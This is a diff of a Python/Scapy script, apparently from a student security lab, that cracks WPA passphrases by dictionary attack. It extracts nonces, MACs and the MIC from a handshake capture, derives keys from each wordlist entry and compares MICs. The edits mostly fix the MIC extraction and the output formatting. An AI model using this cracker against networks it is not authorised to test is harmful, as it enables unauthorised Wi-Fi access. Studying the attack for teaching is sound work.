@@ -1,25 +1,14 @@
 #!/usr/bin/env python
-
 #-*- coding: utf-8 -*-
-
-
-
-#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
-
-#  Authors : Yimnaing Kamdem && Siu Aurelien
-
-#  Objectif: Développer un script en Python/Scapy capable de Lire une passphrase à partir d’un fichier (wordlist)
-
-#            Dériver les clés à partir de la passphrase,Récupérer le MIC du dernier message du 4-way handshake dans         
-
-#            la capture. calculer le MIC du dernier message du 4-way handshake à l’aide de l’algorithme Michael.
-
-#            Comparer les deux MIC.
-
 #
-
 #-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
-
+#  Authors : Yimnaing Kamdem && Siu Aurelien
+#  Objectif: Développer un script en Python/Scapy capable de Lire une passphrase à partir d’un fichier (wordlist)
+#            Dériver les clés à partir de la passphrase,Récupérer le MIC du dernier message du 4-way handshake dans         
+#            la capture. calculer le MIC du dernier message du 4-way handshake à l’aide de l’algorithme Michael.
+#            Comparer les deux MIC.
+#
+#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
@@ -51,11 +40,10 @@ def customPRF512(key,A,B):
 foundPassphrase = False
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
-wpa=rdpcap("wpa_handshake.cap") 
+wpa = rdpcap("wpa_handshake.cap") 
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 A  = "Pairwise key expansion" #this string is used in the pseudo-random function
-
 
 
 # All of them can be seen with : wpa.show() and obtained from the frame 0, 1, and 3.
@@ -71,14 +59,14 @@ SNonce = wpa[6].load[13:45]
 # This is the MIC contained in the 4th frame of the 4-way handshake
 # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
 
-mic_to_test =  b2a_hex(wpa[8].load[-18:2]).decode()
+mic_to_test = wpa[8].load.hex()[-36:][:-4] # "36eef66540fa801ceee2fea9b7929b40"
 B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
-data        = a2b_hex(scapy.utils.linehexdump(wpa[8][EAPOL], 0, 1, True).replace(" ", "").lower().replace( str(mic_to_test), "0" * len(mic_to_test)))
+data        = a2b_hex(scapy.utils.linehexdump(wpa[8][EAPOL], 0, 1, True).replace(" ", "").lower()[:162] + "0" * 32 + "0" * 4)
 
 
 with open('dico.txt') as f:
     for passPhrase in f:
-        if(passPhrase[-1] == '\n'):
+        if(passPhrase[-1] == '\n'):                                                                                                                                                                                                                  
             passPhrase = passPhrase[:-1]
         
         #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
@@ -96,21 +84,21 @@ with open('dico.txt') as f:
         if(mic.hexdigest()[:-8] == mic_to_test):
             foundPassphrase=True	
 
-            print ("\n\npassPhrase found, value :\t\t", passPhrase , "\n")
+            print ("\n\npassPhrase found, value : ", passPhrase , "\n")
             print ("Values used to derivate keys")
             print ("============================")
-            print ("Passphrase: ",passPhrase ,"\n")
-            print ("SSID: ",str(ssid) ,"\n")
-            print ("AP Mac: ",b2a_hex(APmac) ,"\n")
-            print ("CLient Mac: ",b2a_hex(Clientmac) ,"\n")
-            print ("AP Nonce: ",b2a_hex(ANonce) ,"\n")
-            print ("Client Nonce: ",b2a_hex(SNonce), "\n")
+            print ("Passphrase: \t",passPhrase ,"\n")
+            print ("SSID: \t\t", ssid.decode() ,"\n")
+            print ("AP Mac: \t",b2a_hex(APmac).decode() ,"\n")
+            print ("CLient Mac: \t",b2a_hex(Clientmac).decode() ,"\n")
+            print ("AP Nonce: \t",b2a_hex(ANonce).decode() ,"\n")
+            print ("Client Nonce: \t",b2a_hex(SNonce).decode(), "\n")
             
             print ("\nResults of the key expansion")
             print ("=============================")
 
             print ("PMK:\t\t",pmk.hex() ,"\n")
-            print ("PTK:\t\t",pkt.hex() ,"\n")
+            print ("PTK:\t\t",ptk.hex() ,"\n")
             print ("KCK:\t\t",ptk[0:16].hex() ,"\n")
             print ("KEK:\t\t",ptk[16:32].hex() ,"\n")
             print ("TK:\t\t",ptk[32:48].hex() ,"\n")
@@ -118,5 +106,5 @@ with open('dico.txt') as f:
             print ("MIC:\t\t",mic.hexdigest() ,"\n")
 
 if(foundPassphrase == False):
-    print ("\n\npassPhrase not found in dico\n")
+    print ("\npassPhrase not found in dico\n")
 
